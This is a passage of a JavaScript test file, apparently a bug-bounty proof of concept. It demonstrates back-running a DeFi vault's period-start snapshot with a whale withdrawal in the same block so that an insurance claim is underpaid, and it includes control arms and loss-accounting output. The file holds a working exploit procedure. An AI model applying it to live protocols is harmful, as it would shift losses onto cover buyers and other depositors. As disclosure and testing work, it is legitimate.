  await vault.connect(deployer).grantRole(await vault.INCIDENT_ROLE(), await im.getAddress())
  await vault.connect(deployer).grantRole(await vault.PAYOUT_ROLE(), await im.getAddress())
  await vault.connect(ctx.payout_allowlister).addToPayoutAllowlist(payoutReceiver.address)

  return {
    ...ctx, vault, usdc, allocator, im, coverNFT, admin, curator, allocatorRole,
    approver, payoutReceiver, buyer, payoutRecipient,
    marketId: computeMarketId(1, PROTOCOL, MARKET),
    concHash: computeProtocolConcentrationHash(1, PROTOCOL),
  }
}

/**
 * @param sameBlock true  -> whale's withdraw back-runs the commit inside the boundary block
 *                  false -> whale's withdraw is mined in the next block (control)
 */
async function runArm(sameBlock, whaleBps = 8000n) {
  const s = await stack()
  const { vault, usdc, allocator, im, asset } = s
  const token = s.token_contract
  const whale = s.users[0]
  const stayer = s.users[1]

  const TOTAL = 1_000_000n * ONE
  const WHALE = (TOTAL * whaleBps) / 10_000n
  const STAY = TOTAL - WHALE

  await s.utils.mintAndApprove(WHALE, whale)
  await vault.connect(whale).deposit(WHALE, whale.address)
  await s.utils.mintAndApprove(STAY, stayer)
  await vault.connect(stayer).deposit(STAY, stayer.address)

  // ---- period P-1: the curator writes a cover order targeting period P -----
  await time.increase(PERIOD + 1)
  const pPrev = await vault.currentPeriod()

  const coverAmount = 900_000n * ONE_CANON            // 900k canonical USD of cover
  await allocator.connect(s.curator).createCoverOrder(
    s.buyer.address, s.payoutRecipient.address, 'xrp:beneficiary', await usdc.getAddress(),
    [{ marketId: s.marketId, coverAmount, coverRateAnnual: 500 }], 0)
  const orderId = (await allocator.nextCoverOrderId()) - 1n
  const targetPeriod = (await allocator.getCoverOrder(orderId)).period
  expect(targetPeriod).to.equal(pPrev + 1n)

  // ---- the boundary block ---------------------------------------------------
  const periodStart = await vault.currentPeriodEnd()      // == start of period P
  const allocations = [{ marketId: s.marketId, allocatedCover: coverAmount }]
  const root = leafFor(orderId, allocations)

  await ethers.provider.send('evm_setAutomine', [false])
  await ethers.provider.send('evm_setNextBlockTimestamp', [Number(periodStart)])

  // commit first (higher priority fee), whale's withdraw second
  const commitTx = await allocator.connect(s.allocatorRole)
    .commitAllocation(targetPeriod, root, coverAmount, coverAmount,
      { gasLimit: 1_000_000, maxFeePerGas: 200_000_000_000n, maxPriorityFeePerGas: 100_000_000_000n })
  const wdTx = sameBlock
    ? await vault.connect(whale).withdraw(WHALE, whale.address, whale.address,
        { gasLimit: 1_000_000, maxFeePerGas: 200_000_000_000n, maxPriorityFeePerGas: 1_000_000_000n })
    : null

  await ethers.provider.send('evm_mine', [])
  await ethers.provider.send('evm_setAutomine', [true])

  const commitRcpt = await commitTx.wait()
  expect(Number(commitRcpt.blockTimestamp ?? (await ethers.provider.getBlock(commitRcpt.blockNumber)).timestamp),
    'commit must land exactly on the period start').to.equal(Number(periodStart))
  expect(await vault.currentPeriod(), 'we are in the target period').to.equal(targetPeriod)

  let wdRcpt
  if (sameBlock) {
    wdRcpt = await wdTx.wait()
    expect(wdRcpt.blockNumber, 'TREATMENT: withdraw must share the commit block').to.equal(commitRcpt.blockNumber)
    expect(wdRcpt.index > commitRcpt.index, 'TREATMENT: withdraw must be ordered AFTER the commit').to.equal(true)
  } else {
    // control: identical withdraw, next block
    const t = await vault.connect(whale).withdraw(WHALE, whale.address, whale.address)
    wdRcpt = await t.wait()
    expect(wdRcpt.blockNumber > commitRcpt.blockNumber, 'CONTROL: withdraw is in a later block').to.equal(true)
  }

  const commit = await allocator.getAllocationCommitment(targetPeriod)
  const capAfter = await vault.totalAssetsAt(periodStart)

  // CONTROL-VALIDITY INSTRUMENTATION.
  // The control is only a control if the withdrawal is classified IDENTICALLY in both arms
  // and the single difference is the rewritten snapshot. _requestWithdraw buckets into
  // withdrawAssets[currentPeriod() + 1]; if the control's withdraw fell in a different
  // period it would land in a different bucket, change activePayableAmount, and the two
  // arms would differ in two variables instead of one. Measure it rather than assume it.
  const wdBucket = await vault.withdrawAssets(targetPeriod + 1n)
  const wdBlockTs = (await ethers.provider.getBlock(wdRcpt.blockNumber)).timestamp
  const wdPeriodAtWithdraw = await vault.currentPeriod()

  // ---- settle the cover -----------------------------------------------------
  await usdc.mint(s.buyer.address, 1_000_000n * 10n ** 6n)
  await usdc.connect(s.buyer).approve(await allocator.getAddress(), ethers.MaxUint256)
  await allocator.connect(s.allocatorRole).settleCoverOrder(orderId, allocations, [])
  const settled = await allocator.getCoverOrder(orderId)

  // ---- incident in period P, assessed at the full settled cover -------------
  await im.connect(s.curator).createIncident(periodStart, 'incident', ethers.id('ref-1'))
  const incidentId = (await im.nextIncidentId()) - 1n
  await im.connect(s.curator).confirmIncident(incidentId, 'ipfs://r')
  await im.connect(s.curator).addAssessmentLosses(incidentId,
    [{ coverTokenId: orderId, marketId: s.marketId, amount: settled.allocatedCoverAmount }])
  await im.connect(s.curator).submitCurrentAssessment(incidentId)

  // The min()'s OTHER operand, measured immediately before the payout executes. The whole
  // root-cause claim is that activePayableAmount is IDENTICAL across the arms -- the assets
  // are present and payable -- and that the claim is truncated only because the sibling
  // operand assetsAtCapturePeriod was rewritten. That must be measured, not asserted.
  //   activePayableAmount = totalAssets() + withdrawAssets[capturePeriod+1] (+ [capturePeriod+2]
  //   only when payout runs in the following period, which it does not here).
  const activeAssetsPre = await vault.totalAssets()
  const capturePeriodWithdrawalsPre = await vault.withdrawAssets(targetPeriod + 1n)
  const activePayablePre = activeAssetsPre + capturePeriodWithdrawalsPre
  const assetsAtCapturePre = await vault.totalAssetsAt(periodStart)

  const recvBefore = await token.balanceOf(s.payoutReceiver.address)
  await im.connect(s.approver).approveCurrentAssessment(incidentId)
  const paid = (await token.balanceOf(s.payoutReceiver.address)) - recvBefore

  // ---- WORKAROUND ARM ------------------------------------------------------
  // The exposure cap is PER CALL, not aggregate (the program's public known issue [3]).
  // So ask honestly: can the operators recover the shortfall by opening further
  // incidents against the same order in the same period? Loop until the payout stops
  // moving or the window shuts.
  let workaroundPaid = 0n
  let rounds = 0
  if (process.env.K_TS1_WORKAROUND === '1') {
    for (let n = 0; n < Number(process.env.K_TS1_MAX_ROUNDS || 12); n++) {
      const remaining = settled.allocatedCoverAmount - ((paid + workaroundPaid) * (ONE_CANON / ONE))
      if (remaining <= 0n) break
      if (!(await vault.isPeriodInPayoutWindow(targetPeriod))) break
      const before = await token.balanceOf(s.payoutReceiver.address)
      try {
        await im.connect(s.curator).createIncident(periodStart + BigInt(n + 1), `w${n}`, ethers.id(`ref-w${n}`))
        const wid = (await im.nextIncidentId()) - 1n
        await im.connect(s.curator).confirmIncident(wid, 'ipfs://w')
        await im.connect(s.curator).addAssessmentLosses(wid,
          [{ coverTokenId: orderId, marketId: s.marketId, amount: remaining }])
        await im.connect(s.curator).submitCurrentAssessment(wid)
        await im.connect(s.approver).approveCurrentAssessment(wid)
      } catch (e) {
        console.log(`        workaround round ${n} blocked: ${(e.message || '').split('\n')[0].slice(0, 120)}`)
        break
      }
      const got = (await token.balanceOf(s.payoutReceiver.address)) - before
      workaroundPaid += got
      rounds++
      if (got === 0n) break
    }
  }

  // ---- whale exits two periods later ---------------------------------------
  await time.increase(PERIOD * 2 + 10)
  const whaleBefore = await token.balanceOf(whale.address)
  await vault.connect(whale).claimWithdraw(targetPeriod + 1n)
  const whaleGot = (await token.balanceOf(whale.address)) - whaleBefore

  return {
    wdBucket, wdBlockTs, periodStart,
    activeAssetsPre, capturePeriodWithdrawalsPre, activePayablePre, assetsAtCapturePre,
    wdOffsetFromPeriodStart: BigInt(wdBlockTs) - BigInt(periodStart),
    wdPeriodAtWithdraw, targetPeriod,
    coverSold: settled.allocatedCoverAmount,
    vaultTotalUsdc: TOTAL / ONE,
    capacityCommitted: commit.totalAvailableCapacity,
    snapshotAfterBlock: capAfter,
    claimAssessed: settled.allocatedCoverAmount / (ONE_CANON / ONE),  // canonical USD -> 6-dec asset units at $1
    claimPaid: paid,
    workaroundPaid, workaroundRounds: rounds,
    whaleDeposited: WHALE,
    whaleRecovered: whaleGot,
  }
}

describe('K-TS-1 exploit — back-running the period-start snapshot inside the boundary block', function () {
  this.timeout(5 * 60 * 1000)

  it('sells cover against a snapshot that is then rewritten downward in the same block', async () => {
    // K_TS1_ARM lets each arm run ALONE, so verify_poc.py can invoke the control and the
    // exploit as two separate commands and compare them. Unset runs both, as before.
    const ARM = process.env.K_TS1_ARM || 'both'
    const wantT = ARM === 'both' || ARM === 'treatment'
    const wantC = ARM === 'both' || ARM === 'control'

    const treatment = wantT ? await runArm(true) : null
    const control = wantC ? await runArm(false) : null

    // Machine-readable emit. The human table below keeps units and parentheses in the
    // label, which sit between the key and the colon and defeat verify_poc.py's
    // `key <sep> number` match, so the checkable values are printed as bare pairs.
    const emit = (r, p) => {
      if (!r) return
      console.log(`      ${p}_capacity_committed: ${r.capacityCommitted}`)
      console.log(`      ${p}_snapshot_after: ${r.snapshotAfterBlock}`)
      console.log(`      ${p}_claim_assessed: ${r.claimAssessed}`)
      console.log(`      ${p}_claim_paid: ${r.claimPaid}`)
      console.log(`      ${p}_shortfall: ${r.claimAssessed - r.claimPaid}`)
      // Same figure in whole asset tokens (mUSDC is 6dp). A triager should not have to do
      // decimal arithmetic to read the impact, and a number the report states must come
      // out of a real run rather than out of prose.
      console.log(`      ${p}_shortfall_usdc: ${(r.claimAssessed - r.claimPaid) / 1000000n}`)
      // The scenario's scale, so the report can state what the figures are relative to
      // without asserting a number no run produced.
      console.log(`      ${p}_vault_total_usdc: ${r.vaultTotalUsdc}`)
      console.log(`      ${p}_whale_recovered: ${r.whaleRecovered}`)
      // Control validity: identical in BOTH arms means the withdrawal was classified the
      // same way and only the snapshot moved. wd_offset is the whole treatment variable.
      console.log(`      ${p}_withdraw_bucket: ${r.wdBucket}`)
      // The two operands of the min() that decides the payout, side by side.
      console.log(`      ${p}_active_assets_pre: ${r.activeAssetsPre}`)
      console.log(`      ${p}_active_payable_pre: ${r.activePayablePre}`)
      console.log(`      ${p}_assets_at_capture_pre: ${r.assetsAtCapturePre}`)
      console.log(`      ${p}_withdraw_period: ${r.wdPeriodAtWithdraw}`)
      console.log(`      ${p}_target_period: ${r.targetPeriod}`)
      console.log(`      ${p}_wd_offset_from_period_start: ${r.wdOffsetFromPeriodStart}`)
      // The attacker's POSITION, which is the difference between this being a griefing
      // bug and a value-extraction bug. Computed inside a single arm so neither figure
      // depends on the other arm's run: the loss this LP would have borne had the claim
      // been paid in full, minus the loss they actually bore.
      const vaultTotal = BigInt(r.vaultTotalUsdc) * ONE
      const lossActual = r.whaleDeposited - r.whaleRecovered
      const lossIfPaidInFull = (r.claimAssessed * r.whaleDeposited) / vaultTotal
      const escaped = lossIfPaidInFull - lossActual
      console.log(`      ${p}_attacker_share_pct: ${(r.whaleDeposited * 100n) / vaultTotal}`)
      console.log(`      ${p}_other_lps_share_pct: ${100n - (r.whaleDeposited * 100n) / vaultTotal}`)
      console.log(`      ${p}_attacker_loss_if_paid_in_full: ${lossIfPaidInFull}`)
      console.log(`      ${p}_attacker_loss_actual: ${lossActual}`)
      console.log(`      ${p}_attacker_escaped_loss: ${escaped}`)
      console.log(`      ${p}_attacker_escaped_loss_usdc: ${escaped / ONE}`)
      // Residual: the shortfall the cover buyer eats that did NOT go to the attacker went
      // to the other LPs, who escaped on the same rewritten snapshot. The two must sum to
      // the shortfall exactly; if they ever do not, the model of this bug is wrong.
      console.log(`      ${p}_other_lps_escaped_loss: ${(r.claimAssessed - r.claimPaid) - escaped}`)
    }
    // A single-arm run emits NEUTRAL keys, so verify_poc.py's control check compares the
    // same key across both commands (0 vs 700000000000) instead of passing merely because
    // the key was absent from the control output. That distinction is the whole point of
    // check 6: a control that shares no keys with the exploit proves nothing about cause.
    emit(treatment, ARM === 'both' ? 'h13_treatment' : 'h13')
    emit(control, ARM === 'both' ? 'h13_control' : 'h13')

    if (ARM !== 'both') return   // single-arm run: emit and stop, comparisons need both

    const fmt = (r, tag) => {
      console.log(`      ${tag}`)
      console.log(`        capacity committed (read at periodStart) : ${r.capacityCommitted}`)
      console.log(`        snapshot totalAssetsAt(periodStart) after: ${r.snapshotAfterBlock}`)
      console.log(`        cover sold                               : ${r.coverSold}`)
      console.log(`        claim assessed (asset units)             : ${r.claimAssessed}`)
      console.log(`        claim PAID     (asset units)             : ${r.claimPaid}`)
      console.log(`        recovered by extra incidents (workaround): ${r.workaroundPaid} over ${r.workaroundRounds} rounds`)
      console.log(`        whale deposited / recovered              : ${r.whaleDeposited} / ${r.whaleRecovered}`)
    }
    fmt(control, 'CONTROL   — whale withdraws one block later')
    fmt(treatment, 'TREATMENT — whale back-runs the commit in the boundary block')

    // both arms sold identical cover against an identical committed capacity
    expect(treatment.coverSold).to.equal(control.coverSold)
    expect(treatment.capacityCommitted).to.equal(control.capacityCommitted)

    // ... but only the treatment rewrote the snapshot the cap is read from
    expect(treatment.snapshotAfterBlock < control.snapshotAfterBlock,
      'TREATMENT must have rewritten the period-start snapshot downward').to.equal(true)

    // ... and the claimant is short-changed only in the treatment
    const shortfall = treatment.claimAssessed - treatment.claimPaid
    console.log(`      SHORTFALL to the claimant, treatment: ${shortfall} asset units`)
    console.log(`      SHORTFALL to the claimant, control  : ${control.claimAssessed - control.claimPaid}`)
    expect(treatment.claimPaid < control.claimPaid,
      'treatment must pay the assessed claim strictly less than the control').to.equal(true)

    // and the whale walks away whole in the treatment
    console.log(`      whale recovery: treatment ${treatment.whaleRecovered} vs control ${control.whaleRecovered}`)
  })

  it('measures how the operator recovery cost scales with the boundary withdrawal size', async () => {
    // The shortfall is recoverable ONLY because the exposure cap is per-call (the program's
    // public known issue [3]). Each extra incident recovers at most the rewritten snapshot,
    // so the number of incident cycles the operators must run inside the 2-period window is
    // ceil(coverSold / (totalAssets - boundaryWithdrawal)). Measure it.
    console.log('      whale% | snapshot after | first payout |  recovered  | extra incidents needed')
    for (const bps of [5000n, 8000n, 9000n, 9500n]) {
      const r = await runArm(true, bps)
      const short = r.claimAssessed - r.claimPaid - r.workaroundPaid
      console.log(`        ${String(Number(bps) / 100).padStart(4)}% | ${String(r.snapshotAfterBlock).padStart(14)} |` +
        ` ${String(r.claimPaid).padStart(12)} | ${String(r.workaroundPaid).padStart(11)} | ${r.workaroundRounds}` +
        (short > 0n ? `  (STILL SHORT ${short} at the round cap)` : ''))
    }
  })
})
```
